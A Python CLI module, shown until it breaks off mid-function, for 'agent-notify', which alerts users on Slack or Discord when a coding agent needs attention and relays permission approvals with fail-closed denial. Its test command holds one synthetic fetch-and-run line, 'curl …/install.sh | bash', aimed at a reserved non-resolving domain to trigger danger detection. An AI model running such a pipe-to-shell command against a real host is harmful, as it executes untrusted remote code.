from __future__ import annotations

import argparse
import json
import logging
import os
import sys
import time
import traceback
import uuid
from dataclasses import replace
from pathlib import Path
from typing import Any

from . import __version__, dedup, install, macos, paths, pending, pending_approvals, transcript
from .config import (
    CONFIG_TEMPLATE,
    Config,
    default_config_path,
    load_config,
    match_route,
    sinks_for,
    workspace_for,
)
from .event import Event
from .gating import SystemState, should_send

# Per-kind dedup windows. Permission gets a much longer window because Claude
# Code's `Notification:permission_prompt` can fire tens of seconds after the
# `PermissionRequest` hook for the same logical event (especially when the user
# is slow to respond). Both hooks fire per-session so collisions across distinct
# permissions within 60s are unusual enough to accept as a tradeoff.
DEDUP_TTLS: dict[str, float] = {
    "permission": 60.0,
    "turn_complete": 5.0,
}

# Cross-kind coalescing: turn_complete and idle_prompt describe the same moment
# ("agent is done, please engage") — only the first one per session-turn
# should ping. The primary reset is `UserPromptSubmit` (user typed a reply →
# we're in a new turn), which clears the marker immediately. The TTL is a
# safety net: if that hook fails to fire (misconfigured, Claude Code bug,
# different surface) the marker can't silence notifications indefinitely. 5
# minutes is long enough that Claude Code's ~60s idle_prompt follow-up is
# reliably suppressed, short enough that a broken UserPromptSubmit doesn't
# kill pings for more than one cycle.
_TURN_OR_IDLE_KINDS = frozenset({"turn_complete", "idle_prompt"})
_TURN_OR_IDLE_TTL = 300.0
from .sinks.base import Sink, SinkError
from .sinks.discord import DiscordSink
from .sinks.slack import SlackSink
from .sources import claude_code as src_claude
from .sources import codex as src_codex

# Indirection so tests can neutralize the sleep without touching `time`.
_sleep = time.sleep


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="agent-notify",
        description="Pings you (Slack/Discord) when a coding agent needs attention.",
    )
    p.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    p.add_argument("--config", type=Path, help="Override config file path.")
    p.add_argument(
        "--debug",
        action="store_true",
        help="Enable verbose DEBUG logging to stderr (default: WARNING).",
    )
    sub = p.add_subparsers(dest="cmd", required=True)

    hook = sub.add_parser("hook", help="Process an agent hook payload on stdin.")
    hook.add_argument("--source", required=True, choices=["claude-code", "codex"])
    hook.add_argument(
        "--force",
        action="store_true",
        help="Bypass gating and always dispatch (for debugging).",
    )

    cfg = sub.add_parser("config", help="Config management.")
    cfg_sub = cfg.add_subparsers(dest="cfg_cmd", required=True)
    cfg_sub.add_parser("path", help="Print the config file path.")
    cfg_sub.add_parser("init", help="Write a commented config template.")

    inst = sub.add_parser("install", help="Install hooks into an agent's config.")
    inst.add_argument("target", choices=["claude-code", "codex", "slack-bot"])
    inst.add_argument(
        "--no-launchd",
        action="store_true",
        help="(slack-bot only) Skip writing the launchd plist that supervises `agent-notify daemon`.",
    )

    test = sub.add_parser("test", help="Send a synthetic test event through sinks.")
    test.add_argument("--kind", default="permission",
                      choices=["permission", "idle_prompt", "turn_complete", "elicitation"])
    test.add_argument("--force", action="store_true", help="Bypass gating.")
    test.add_argument("--dangerous", action="store_true",
                      help="Use a dangerous command in the synthetic tool_input (for permission kind).")

    sub.add_parser("doctor", help="Check config, connectivity, and install state.")

    sub.add_parser(
        "daemon",
        help="Run the Slack Socket Mode listener (required for actionable approvals).",
    )

    slack = sub.add_parser(
        "slack",
        help="Manage Slack workspaces (tokens + config blocks).",
    )
    slack_sub = slack.add_subparsers(dest="slack_cmd", required=True)

    slack_add = slack_sub.add_parser(
        "add",
        help="Add or update a Slack workspace (interactive unless flags supplied).",
    )
    slack_add.add_argument("--name", default=None,
                           help="Workspace name (default: 'default').")
    slack_add.add_argument("--bot-token", default=None,
                           help="Bot token (xoxb-…). Pass '-' to read from stdin.")
    slack_add.add_argument("--app-token", default=None,
                           help="App-level token (xapp-…). Pass '-' to read from stdin.")
    slack_add.add_argument("--channel", default=None,
                           help="Default channel (e.g. '@me' for DM, '#chan' for channel).")
    slack_add.add_argument("--approvers", default=None,
                           help="Comma-separated Slack user IDs (U…). "
                                "Required for non-DM channels.")
    slack_add.add_argument("--no-verify", action="store_true",
                           help="Skip the auth.test round-trip.")
    slack_add.add_argument("--no-actionable", action="store_true",
                           help="Don't set actionable_approvals=true in the block "
                                "(webhook-style notifications only, no buttons).")

    slack_sub.add_parser("list", help="List configured Slack workspaces.")

    slack_remove = slack_sub.add_parser(
        "remove",
        help="Remove a Slack workspace (deletes config block + Keychain entries).",
    )
    slack_remove.add_argument("name")

    slack_test = slack_sub.add_parser(
        "test",
        help="Post a synthetic smoke-test message to a workspace.",
    )
    slack_test.add_argument("name")

    # Hidden: internal deferred-dispatch subcommand invoked by a detached child
    # to coalesce a queued turn_complete after a short window.
    defer = sub.add_parser("_defer-dispatch", add_help=False)
    defer.add_argument("agent")
    defer.add_argument("session_id", nargs="?", default="")

    return p


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    # Configure logging early so subcommand setup logs land somewhere.
    # The daemon installs its own rotating-file handler later (see
    # cmd_daemon); other commands only ever log to stderr.
    from . import logging_setup
    logging_setup.configure(debug=args.debug)

    # One-time: migrate legacy XDG state into ~/.agent-notify/ if present.
    # Runs before any path-using code so all subsequent calls see the new
    # layout. No-op after the first successful migration.
    try:
        paths.migrate_legacy_state()
    except Exception:  # noqa: BLE001 - migration must never block the hook
        pass

    try:
        if args.cmd == "hook":
            return cmd_hook(args)
        if args.cmd == "config":
            return cmd_config(args)
        if args.cmd == "install":
            return cmd_install(args)
        if args.cmd == "test":
            return cmd_test(args)
        if args.cmd == "doctor":
            return cmd_doctor(args)
        if args.cmd == "daemon":
            return cmd_daemon(args)
        if args.cmd == "slack":
            return cmd_slack(args)
        if args.cmd == "_defer-dispatch":
            return cmd_defer_dispatch(args)
    except Exception:  # noqa: BLE001 - never block the agent
        traceback.print_exc(file=sys.stderr)
        return 0
    return 0


# ---- commands ----


def cmd_hook(args: argparse.Namespace) -> int:
    raw = sys.stdin.read().strip()
    if not raw:
        return 0
    try:
        payload = json.loads(raw)
    except json.JSONDecodeError as e:
        print(f"agent-notify: malformed hook JSON: {e}", file=sys.stderr)
        return 0

    # UserPromptSubmit is a control signal, not a ping: the user just replied,
    # which starts a new turn. Reset all dedup markers for this session —
    # the cross-kind coalesce marker AND any within-kind twin-fire markers —
    # so the next turn's events can ping cleanly without colliding with the
    # previous turn's state.
    if args.source == "claude-code" and payload.get("hook_event_name") == "UserPromptSubmit":
        session_id = payload.get("session_id")
        cleared = dedup.forget_session("claude-code", session_id)
        if cleared:
            _log_event(
                f"UserPromptSubmit cleared {cleared} marker(s) sess={session_id}"
            )
        return 0

    # PermissionRequest fires when Claude Code is about to show a permission
    # dialog — i.e. only for tool calls that aren't auto-allowed. When the
    # resolved workspace has `actionable_approvals = true`, we post a Slack
    # message with approve/deny buttons and block on the user's click via
    # `cmd_permissionrequest` (the daemon resolves the FIFO; we emit Claude
    # Code's `decision.behavior` JSON; fails closed on any error). When
    # actionable approvals are off (or no route matches), we fall through
    # to the normal parse-and-send notification path so the user still gets
    # a ping.
    if args.source == "claude-code" and payload.get("hook_event_name") == "PermissionRequest":
        config = load_config(args.config)
        cwd = Path(payload.get("cwd") or ".")
        resolved = sinks_for(cwd, config)
        if resolved is not None:
            slack_cfg, _ = resolved
            if slack_cfg.enabled and slack_cfg.actionable_approvals:
                return cmd_permissionrequest(payload, config)
        # else: fall through to the notification flow below.

    source_app = macos.term_program_to_app(os.environ.get("TERM_PROGRAM"))
    parse = src_claude.parse if args.source == "claude-code" else src_codex.parse
    event = parse(payload, source_app=source_app)
    if event is None:
        return 0

    if not args.force and _is_duplicate(event):
        return 0

    config = load_config(args.config)

    # An idle_prompt supersedes a queued turn_complete for the same session —
    # discard the queued event so the deferred dispatcher's subsequent claim
    # returns None.
    if event.kind == "idle_prompt":
        pending.claim(event.agent, event.session_id)

    if (
        event.kind == "turn_complete"
        and config.display.coalesce_window_seconds > 0
        and not args.force
    ):
        if not should_send(event, config, _snapshot_state()):
            return 0
        pending.write(event)
        _log_event(
            f"hook queued turn_complete agent={event.agent} "
            f"sess={event.session_id} spawning={sys.executable}"
        )
        _spawn_defer_child(args.config, event.agent, event.session_id)
        return 0

    if not args.force and not should_send(event, config, _snapshot_state()):
        return 0
    if not args.force and _turn_or_idle_recently_dispatched(event):
        _log_event(
            f"hook suppressed {event.kind} — already pinged turn/idle for "
            f"sess={event.session_id} within {_TURN_OR_IDLE_TTL}s"
        )
        return 0
    event = _maybe_apply_snippet(event, config)
    _dispatch(event, config)
    return 0


def cmd_defer_dispatch(args: argparse.Namespace) -> int:
    # Retained for backward compatibility / manual invocation; the production
    # path uses double-fork `_run_defer_inline` and never re-execs through argv.
    _run_defer_inline(args.config, args.agent, args.session_id or None)
    return 0


def cmd_slack(args: argparse.Namespace) -> int:
    """Dispatch `agent-notify slack {add,list,remove,test}`."""
    from . import slack_admin

    if args.slack_cmd == "add":
        return slack_admin.run_add_wizard(
            name=args.name,
            bot_token=args.bot_token,
            app_token=args.app_token,
            channel=args.channel,
            approvers=args.approvers,
            no_verify=args.no_verify,
            no_actionable=args.no_actionable,
            config_path=args.config,
        )
    if args.slack_cmd == "list":
        try:
            workspaces = slack_admin.list_workspaces(args.config)
        except Exception as e:  # noqa: BLE001
            print(f"agent-notify: failed to load config: {e}", file=sys.stderr)
            return 1
        if not workspaces:
            print("No Slack workspaces configured. Run `agent-notify slack add`.")
            return 0
        for ws in workspaces:
            badges = []
            badges.append("ENABLED" if ws.enabled else "disabled")
            badges.append("bot" if ws.has_bot_token else "NO-BOT-TOKEN")
            if ws.has_app_token:
                badges.append("app")
            if ws.actionable_approvals:
                badges.append("interactive")
            print(f"  {ws.name}: {', '.join(badges)}")
            print(f"    channel: {ws.channel or '(unset)'}")
            if ws.approver_user_ids:
                print(f"    approvers: {', '.join(ws.approver_user_ids)}")
            if ws.approver_user_groups:
                print(f"    groups:    {', '.join(ws.approver_user_groups)}")
        return 0
    if args.slack_cmd == "remove":
        summary = slack_admin.remove_workspace(args.name, config_path=args.config)
        if summary["config_removed"]:
            print(f"removed [slack.workspaces.{args.name}] from config.toml")
        else:
            print(f"no [slack.workspaces.{args.name}] block found in config.toml")
        for acc in summary["keychain_removed"]:
            print(f"removed keychain entry agent-notify:{acc}")
        return 0
    if args.slack_cmd == "test":
        ok, msg = slack_admin.test_workspace(args.name, config_path=args.config)
        if ok:
            print(f"✓ {msg}")
            return 0
        print(f"✗ {msg}", file=sys.stderr)
        return 1
    return 1


def cmd_daemon(args: argparse.Namespace) -> int:
    """Run the Slack Socket Mode listener forever (required for actionable approvals).

    Re-configures logging with a rotating file handler at
    `paths.daemon_log()` in addition to stderr — launchd captures stderr,
    but the rotating file gives the user a single bounded place to look
    for forensic context.
    """
    from . import logging_setup, slack_socket

    logging_setup.configure(debug=args.debug, daemon=True)
    # The daemon is verbose enough that INFO is the right "normal" level —
    # raise the floor above the WARNING default unless --debug is set.
    if not args.debug:
        logging.getLogger().setLevel(logging.INFO)
    config = load_config(args.config)
    slack_socket.run_daemon(config)
    return 0


def cmd_permissionrequest(
    payload: dict,
    config: Config,
    *,
    poster=None,
    clock=time.monotonic,
    stdout=None,
) -> int:
    """Block on a Slack approve/deny round-trip for a PermissionRequest hook.

    Emits Claude Code's expected stdout JSON with `decision.behavior`, and
    fails closed (deny) on any error path so a misconfigured bot never
    silently rubber-stamps a tool call. The blocking is just a FIFO read
    with timeout — the work happens in the daemon process that resolves
    the approval.
    """
    from .sinks import slack as slack_sink

    out = stdout if stdout is not None else sys.stdout

    cwd = Path(payload.get("cwd") or ".")
    resolved = sinks_for(cwd, config)
    if resolved is None:
        # No route matches this cwd. Emit nothing so Claude Code falls back
        # to showing its own permission dialog. PermissionRequest only fires
        # when the harness was about to prompt anyway, so a no-op output
        # cleanly hands control back to the user's terminal UI.
        return 0
    slack_cfg, _ = resolved
    workspace_name = workspace_for(cwd, config)

    if not (slack_cfg.enabled and slack_cfg.actionable_approvals):
        # Feature off for this route. Emit nothing — the harness will show
        # its normal permission dialog, same as if our hook weren't here.
        return 0

    approval_id = str(uuid.uuid4())
    session_id = payload.get("session_id")
    tool_name = payload.get("tool_name")
    tool_input = payload.get("tool_input") if isinstance(payload.get("tool_input"), dict) else None
    transcript_raw = payload.get("transcript_path")
    transcript_path = Path(transcript_raw) if isinstance(transcript_raw, str) and transcript_raw else None
    permission_suggestions = _validate_permission_suggestions(
        payload.get("permission_suggestions")
    )

    event = Event(
        agent="claude-code",
        kind="permission",
        message="",
        cwd=cwd,
        session_id=session_id,
        tool_name=tool_name,
        tool_input=tool_input,
        source_app=macos.term_program_to_app(os.environ.get("TERM_PROGRAM")),
        transcript_path=transcript_path,
        permission_suggestions=permission_suggestions,
    )

    _log_event(
        f"PermissionRequest approval_id={approval_id} tool={tool_name} sess={session_id} "
        f"workspace={workspace_name} suggestions={len(permission_suggestions or ())}"
    )
    pending_approvals.create(
        approval_id,
        agent="claude-code",
        session_id=session_id,
        tool_name=tool_name,
        tool_input=tool_input,
        workspace=workspace_name,
        permission_suggestions=list(permission_suggestions) if permission_suggestions else None,
    )

    try:
        channel, message_ts = slack_sink.post_approval_message(
            event,
            slack_cfg,
            approval_id,
            max_chars=config.tool_input_max_chars,
            verbosity=config.display.verbosity,
            message_max_chars=config.display.message_max_chars,
            message_preview_head_chars=config.display.message_preview_head_chars,
            message_preview_tail_chars=config.display.message_preview_tail_chars,
            workspace=workspace_name,
            poster=poster,
        )
        pending_approvals.set_message_ref(approval_id, channel, message_ts)
        _log_event(f"PermissionRequest posted slack channel={channel} ts={message_ts}")
    except Exception as e:  # noqa: BLE001
        _log_event(f"PermissionRequest slack post failed: {e}")
        pending_approvals.cleanup(approval_id)
        # Fail-closed: deny the tool call rather than leaving the agent hung.
        _emit_decision(out, "deny", reason=f"agent-notify: Slack post failed: {e}")
        return 0

    # approval_timeout_seconds == 0 means "wait forever" — leave the
    # approval pending until the user resolves it from Slack on any device,
    # rather than auto-denying. The Slack message stays clickable.
    wait_timeout: float | None = (
        None if slack_cfg.approval_timeout_seconds == 0
        else slack_cfg.approval_timeout_seconds
    )
    record = pending_approvals.wait(approval_id, timeout=wait_timeout)
    if record is None:
        _log_event(f"PermissionRequest timed out approval_id={approval_id}")
        # Try to mark the message as timed-out; best-effort.
        try:
            if slack_cfg.bot_token:
                body = slack_sink.build_resolved_message(event, "timeout", "system")
                slack_sink.update_message(
                    slack_cfg.bot_token, channel, message_ts, body, poster=poster,
                )
        except Exception:  # noqa: BLE001
            pass
        pending_approvals.cleanup(approval_id)
        _emit_decision(out, "deny", reason="agent-notify: approval timed out")
        return 0

    decision = record["decision"]
    selected_idx = record.get("selected_option_index")
    selected_options = record.get("selected_options") or {}
    freeform_answers = record.get("freeform_answers") or {}
    selected_suggestion_idx = record.get("selected_suggestion_index")
    deny_reason = record.get("deny_reason")
    _log_event(
        f"PermissionRequest resolved approval_id={approval_id} decision={decision} "
        f"selected_option_index={selected_idx} selected_options={selected_options} "
        f"freeform_answers_keys={sorted(freeform_answers.keys()) if isinstance(freeform_answers, dict) else None} "
        f"selected_suggestion_index={selected_suggestion_idx} "
        f"deny_reason={'<set>' if deny_reason else None}"
    )
    pending_approvals.cleanup(approval_id)

    updated_input = None
    updated_permissions = None
    emit_reason = None
    if decision == "allow":
        # Suggestion clicks → updatedPermissions (apply the rule edit
        # the user picked). Mutually exclusive with AskUserQuestion
        # option clicks since suggestion buttons don't render alongside
        # option buttons.
        if isinstance(selected_suggestion_idx, int):
            updated_permissions = _suggestion_to_updated_permissions(
                record, selected_suggestion_idx,
            )
        # AskUserQuestion answers → updatedInput.answers. Multi-Q dict
        # (option clicks + freeform text) preferred over legacy single-Q
        # int. Freeform text wins per question over option labels.
        elif selected_options or freeform_answers:
            updated_input = _ask_user_question_updated_input_multi(
                record, selected_options, freeform_answers=freeform_answers,
            )
        elif isinstance(selected_idx, int):
            updated_input = _ask_user_question_updated_input(record, selected_idx)
    else:
        # decision == "deny" — surface the typed reason to Claude.
        if isinstance(deny_reason, str) and deny_reason.strip():
            emit_reason = deny_reason
    _emit_decision(
        out, decision,
        reason=emit_reason,
        updated_input=updated_input,
        updated_permissions=updated_permissions,
    )
    return 0


# Recognised values for `permission_suggestion.behavior`. Claude Code's hook
# schema documents these three; anything else is dropped at parse time so a
# tampered hook payload can't smuggle an unknown verb into
# `decision.updatedPermissions`.
_VALID_SUGGESTION_BEHAVIORS = frozenset({"allow", "deny", "ask"})


def _validate_permission_suggestions(raw: Any) -> tuple[dict, ...] | None:
    """Validate the PermissionRequest hook's `permission_suggestions` payload.

    Drops any entry that doesn't match the documented shape; returns None if
    nothing survives. We accept only suggestions that:
      - are dicts,
      - carry a `behavior` string in {allow, deny, ask},
      - carry a non-empty `type` string (Claude Code dispatches on this).

    The Slack daemon writes whichever surviving suggestion the user clicks
    straight into `decision.updatedPermissions` — silently dropping malformed
    entries here is the trust boundary for that path.
    """
    if not isinstance(raw, list) or not raw:
        return None
    cleaned: list[dict] = []
    dropped = 0
    for item in raw:
        if not isinstance(item, dict):
            dropped += 1
            continue
        behavior = item.get("behavior")
        if behavior not in _VALID_SUGGESTION_BEHAVIORS:
            dropped += 1
            continue
        type_field = item.get("type")
        if not isinstance(type_field, str) or not type_field:
            dropped += 1
            continue
        cleaned.append(item)
    if dropped:
        _log_event(
            f"PermissionRequest dropped {dropped}/{len(raw)} malformed permission_suggestions"
        )
    return tuple(cleaned) if cleaned else None


def _suggestion_to_updated_permissions(record: dict, idx: int) -> list | None:
    """Pull the indexed suggestion off the record and shape it as
    PermissionRequest's `decision.updatedPermissions` payload (a single-
    element list — the suggestion is already in the right shape).
    Returns None if the index is out of range or the record's
    permission_suggestions is missing/malformed.
    """
    suggestions = record.get("permission_suggestions")
    if not isinstance(suggestions, list):
        return None
    if not (0 <= idx < len(suggestions)):
        return None
    suggestion = suggestions[idx]
    if not isinstance(suggestion, dict):
        return None
    return [suggestion]


def _ask_user_question_updated_input(record: dict, selected_idx: int) -> dict | None:
    """Build an updatedInput payload for the legacy single-question
    AskUserQuestion path. Returns None if the record's tool_input isn't
    a recognizable AUQ shape.
    """
    tool_input = record.get("tool_input")
    if not isinstance(tool_input, dict):
        return None
    questions = tool_input.get("questions")
    if not isinstance(questions, list) or not questions:
        return None
    q = questions[0]
    if not isinstance(q, dict):
        return None
    question_text = q.get("question")
    options = q.get("options")
    if not isinstance(question_text, str) or not isinstance(options, list):
        return None
    if not (0 <= selected_idx < len(options)):
        return None
    opt = options[selected_idx]
    if not isinstance(opt, dict):
        return None
    label = opt.get("label")
    if not isinstance(label, str):
        return None
    return {"answers": {question_text: label}}


def _ask_user_question_updated_input_multi(
    record: dict,
    selected_options: dict[str, int],
    *,
    freeform_answers: dict[str, str] | None = None,
) -> dict | None:
    """Build an updatedInput payload from multi-question answers. Returns
    {"answers": {<Q text>: <answer>, ...}} for every question that has a
    recorded answer; questions without an answer are omitted (Claude Code
    falls back to terminal-prompt for those, which matches the
    AskUserQuestion partial-answer semantic).

    `freeform_answers` (str_q_idx → typed text) wins over `selected_options`
    per question — when the user submits a custom answer modal for Q1, the
    typed string lands in `answers[Q1]` instead of an option label.
    """
    tool_input = record.get("tool_input")
    if not isinstance(tool_input, dict):
        return None
    questions = tool_input.get("questions")
    if not isinstance(questions, list) or not questions:
        return None
    freeform = freeform_answers if isinstance(freeform_answers, dict) else {}
    answers: dict[str, str] = {}
    # Iterate questions in order so the answer dict is deterministic.
    for q_idx, q in enumerate(questions):
        if not isinstance(q, dict):
            continue
        question_text = q.get("question")
        if not isinstance(question_text, str):
            continue
        key = str(q_idx)
        ftext = freeform.get(key)
        if isinstance(ftext, str) and ftext:
            answers[question_text] = ftext
            continue
        opt_idx = selected_options.get(key)
        if not isinstance(opt_idx, int):
            continue
        options = q.get("options")
        if not isinstance(options, list) or not (0 <= opt_idx < len(options)):
            continue
        opt = options[opt_idx]
        if not isinstance(opt, dict):
            continue
        label = opt.get("label")
        if not isinstance(label, str):
            continue
        answers[question_text] = label
    if not answers:
        return None
    return {"answers": answers}


def _emit_decision(
    out,
    decision: str,
    *,
    reason: str | None = None,
    updated_input: dict | None = None,
    updated_permissions: list | None = None,
) -> None:
    # PermissionRequest's decision schema only allows allow/deny — no "ask"
    # or "defer" (those are PreToolUse-only). Reason is carried as
    # decision.message and is only meaningful when denying. updated_input
    # and updated_permissions are allow-only — they modify the tool's
    # parameters / extend the user's permission rules respectively. Used
    # for AskUserQuestion option clicks (updated_input) and for
    # permission_suggestion clicks (updated_permissions).
    assert decision in ("allow", "deny"), f"invalid decision: {decision!r}"
    decision_obj: dict = {"behavior": decision}
    if reason and decision == "deny":
        decision_obj["message"] = reason
    if updated_input is not None and decision == "allow":
        decision_obj["updatedInput"] = updated_input
    if updated_permissions is not None and decision == "allow":
        decision_obj["updatedPermissions"] = updated_permissions
    payload = {
        "hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": decision_obj,
        }
    }
    out.write(json.dumps(payload))
    out.write("\n")
    try:
        out.flush()
    except Exception:
        pass


def _maybe_apply_snippet(event: Event, config: Config) -> Event:
    """Replace `event.message` with a head/tail slice of the last assistant turn.

    Applies to turn_complete AND idle_prompt events: in the common coalesce
    flow the turn_complete ping is cancelled by the follow-up idle_prompt, so
    idle_prompt is where the snippet actually needs to appear. Permission and
    elicitation already have meaningful bodies (tool_input / MCP message), so
    they're left alone.
    """
    if not config.summary.enabled:
        return event
    if event.kind not in ("turn_complete", "idle_prompt"):
        return event
    if event.transcript_path is None:
        return event
    text = transcript.read_last_assistant_text(event.transcript_path)
    if not text:
        return event
    snippet = transcript.head_tail_snippet(
        text,
        head=config.summary.head_chars,
        tail=config.summary.tail_chars,
    )
    if not snippet:
        return event
    return replace(event, message=snippet)


def _spawn_defer_child(
    config_path: Path | None, agent: str, session_id: str | None
) -> None:
    """POSIX double-fork a daemon grandchild that runs the defer dispatch.

    We tried `subprocess.Popen(start_new_session=True, stderr=<log>)` first and
    found the child was dying before it could write a single log line —
    despite stderr pointing at defer.log. Some combination of Claude Code's
    hook process lifecycle and subprocess re-exec was killing it.

    Double-fork sidesteps all of that: the grandchild inherits the parent's
    interpreter (no re-import, no `sys.executable` dependency), detaches from
    the session via `setsid`, and is reparented to init when the middle
    process exits — so Claude Code can't reap it. The parent reaps the middle
    process immediately so it doesn't become a zombie.
    """
    try:
        first = os.fork()
    except OSError as e:
        print(f"agent-notify: failed to fork defer child: {e}", file=sys.stderr)
        return
    if first != 0:
        # Parent: reap the middle child (which exits instantly) and return.
        try:
            os.waitpid(first, 0)
        except OSError:
            pass
        return
    # Middle process: detach from session, fork again, exit so the
    # grandchild is reparented to init (PID 1).
    try:
        os.setsid()
        second = os.fork()
        if second != 0:
            os._exit(0)
    except OSError:
        os._exit(0)
    # Grandchild: this is the daemon. Redirect stdio to /dev/null and stderr
    # to defer.log, then run the dispatch inline.
    try:
        _daemonize_fds()
        _run_defer_inline(config_path, agent, session_id)
    except Exception:  # noqa: BLE001
        traceback.print_exc(file=sys.stderr)
    finally:
        os._exit(0)


def _daemonize_fds() -> None:
    """Redirect stdin/stdout/stderr for the daemon grandchild.

    stdin/stdout → /dev/null; stderr → defer.log (append). The redirection
    happens before any real work so a crash during load_config / import
    surfaces in the log rather than being swallowed."""
    log_path = _defer_log_path()
    paths.ensure_dir(log_path.parent)
    devnull = os.open(os.devnull, os.O_RDWR)
    err_fd = os.open(str(log_path), os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
    os.dup2(devnull, 0)
    os.dup2(devnull, 1)
    os.dup2(err_fd, 2)
    if devnull > 2:
        os.close(devnull)
    if err_fd > 2:
        os.close(err_fd)


def _run_defer_inline(
    config_path: Path | None, agent: str, session_id: str | None
) -> None:
    """Run the defer dispatch without re-parsing argv. Mirrors cmd_defer_dispatch.

    Kept separate so the double-fork grandchild doesn't pay import / argparse
    cost and so tests can exercise the same code path without actually forking.
    """
    _log_event(f"defer grandchild started agent={agent} sess={session_id}")
    config = load_config(config_path)
    if config.display.coalesce_window_seconds > 0:
        _sleep(config.display.coalesce_window_seconds)
    event = pending.claim(agent, session_id)
    if event is None:
        _log_event(f"defer grandchild exit: no pending sess={session_id}")
        return
    # Cross-kind dedup — if the user's machine answered quickly and an
    # idle_prompt already dispatched for this session, suppress ourselves.
    if _turn_or_idle_recently_dispatched(event):
        _log_event(
            f"defer grandchild suppressed: idle_prompt already pinged sess={session_id}"
        )
        return
    event = _maybe_apply_snippet(event, config)
    _log_event(f"defer grandchild dispatching sess={session_id} msg_len={len(event.message)}")
    _dispatch(event, config)
    _log_event(f"defer grandchild done sess={session_id}")


def _defer_log_path() -> Path:
    return paths.defer_log()


def _log_event(msg: str) -> None:
    """Append a timestamped line to defer.log with 0600 perms. Swallows all
    errors — a hook logging failure must never block the agent. Used to
    audit the defer pipeline (pending write, subprocess spawn, claim,
    dispatch)."""
    try:
        path = _defer_log_path()
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        with paths.open_append_secure(path) as f:
            f.write(f"[{ts}] pid={os.getpid()} {msg}\n")
    except OSError:
        pass


def _turn_or_idle_recently_dispatched(event: Event) -> bool:
    """Check-and-mark whether we already pinged turn_complete/idle_prompt
    for this session within the cross-kind coalesce window.

    The mark is written on first call (so the second call returns True and
    suppresses). Same semantics as `dedup.recently_seen`, just a different key
    namespace so it doesn't collide with the within-kind dedup used for
    twin-fires (PermissionRequest + Notification:permission_prompt).
    """
    if event.kind not in _TURN_OR_IDLE_KINDS:
        return False
    key = f"turn_or_idle:{event.agent}:{event.session_id or ''}"
    return dedup.recently_seen(key, ttl=_TURN_OR_IDLE_TTL)


def _is_duplicate(event: Event) -> bool:
    # Both agents can fire two hooks for the same logical event:
    #   - Claude Code: `PermissionRequest` + `Notification:permission_prompt`
    #                  (can be delayed up to ~60s when the user is slow to answer)
    #   - Codex:       `notify` (agent-turn-complete) + the `Stop` hook
    # Collapse pairs within a kind-specific TTL keyed on (agent, kind, session).
    # We deliberately ignore tool_name — the Notification payload doesn't carry
    # it so the keys would diverge otherwise.
    ttl = DEDUP_TTLS.get(event.kind)
    if ttl is None:
        return False
    key = dedup.dedup_key(event.agent, event.kind, event.session_id, None)
    return dedup.recently_seen(key, ttl=ttl)


def cmd_config(args: argparse.Namespace) -> int:
    path = args.config or default_config_path()
    if args.cfg_cmd == "path":
        print(path)
        return 0
    if args.cfg_cmd == "init":
        if path.exists():
            print(f"agent-notify: {path} already exists; not overwriting", file=sys.stderr)
            return 1
        paths.write_secure(path, CONFIG_TEMPLATE)
        print(f"Wrote {path}")
        return 0
    return 1


def cmd_install(args: argparse.Namespace) -> int:
    if args.target == "claude-code":
        added = install.install_claude_code()
        if added:
            print(f"Claude Code: added hooks for {', '.join(added)}")
        else:
            print("Claude Code: hooks already installed; nothing to do.")
        return 0
    if args.target == "slack-bot":
        summary = install.install_slack_bot(install_plist=not args.no_launchd)
        added = summary["claude_hooks_added"]
        if added:
            print(f"Claude Code: added hooks for {', '.join(added)}")
        else:
            print("Claude Code: hooks already installed; nothing to do.")
        plist_path = summary["plist_path"]
        if plist_path is not None:
            if summary["plist_written"]:
                print(f"launchd: wrote {plist_path}")
                print(f"         to start now: launchctl load {plist_path}")
            else:
                print(f"launchd: {plist_path} already up to date.")
        print(
            "\nNext steps:\n"
            "  1. Create a Slack App from docs/slack-app-manifest.yaml at\n"
            "     https://api.slack.com/apps → Create New App → From a manifest.\n"
            "  2. Install to workspace, then copy the bot token (xoxb-…). On\n"
            "     the app's Basic Information page, generate an App-Level token\n"
            "     with `connections:write` scope — that's your xapp-… token.\n"
            "  3. Run `agent-notify slack add` — the wizard stores both tokens\n"
            "     in macOS Keychain and writes [slack.workspaces.default] into\n"
            "     ~/.agent-notify/config.toml.\n"
            "  4. launchctl load <plist>  (or run `agent-notify daemon` in a terminal).",
            file=sys.stderr,
        )
        return 0
    summary = install.install_codex()
    if summary["hooks_added"]:
        print(f"Codex: added hooks for {', '.join(summary['hooks_added'])}")
    if summary["config_updated"]:
        print("Codex: updated ~/.codex/config.toml (notify + features.codex_hooks)")
    if not summary["hooks_added"] and not summary["config_updated"]:
        print("Codex: already installed; nothing to do.")
    if "previous_notify" in summary:
        print(
            f"Codex: previous notify = {summary['previous_notify']} was replaced.",
            file=sys.stderr,
        )
    return 0


def cmd_test(args: argparse.Namespace) -> int:
    tool_input = None
    if args.kind == "permission":
        if args.dangerous:
            # Pick a pattern that still trips DANGEROUS_BASH_PATTERNS (via
            # `| bash`) but can't do damage if a user accidentally copy-
            # pastes the notification text into a shell — `.invalid` is a
            # reserved TLD that DNS never resolves, so curl fails cleanly.
            tool_input = {
                "command": "curl https://example.invalid/install.sh | bash",
                "description": "synthetic dangerous command",
            }
        else:
            tool_input = {"command": "echo 'hello from agent-notify'"}
    event = Event(
        agent="claude-code",
        kind=args.kind,
        message="Synthetic test event from agent-notify",
        cwd=Path.cwd(),
        session_id="test1234",
        tool_name="Bash" if args.kind == "permission" else None,
        tool_input=tool_input,
        source_app=macos.term_program_to_app(os.environ.get("TERM_PROGRAM")),
    )
    config = load_config(args.config)
    if not args.force and not should_send(event, config, _snapshot_state()):
        print(
            "Gating suppressed the test event (use --force to bypass).",
            file=sys.stderr,
        )
        return 0
    _dispatch(event, config)
    print("Test event dispatched.")
    return 0


def cmd_doctor(args: argparse.Namespace) -> int:
    path = args.config or default_config_path()
    print(f"Config: {path}  {'(exists)' if path.exists() else '(missing)'}")
    try:
        config = load_config(args.config)
    except Exception as e:  # noqa: BLE001
        print(f"  ! failed to load: {e}")
        return 1
    print(f"  gating: {config.gating}  idle_threshold: {config.idle_threshold_seconds}s")

    # Slack workspaces (per-workspace status — multi-instance).
    if config.slack_workspaces:
        print("Slack workspaces:")
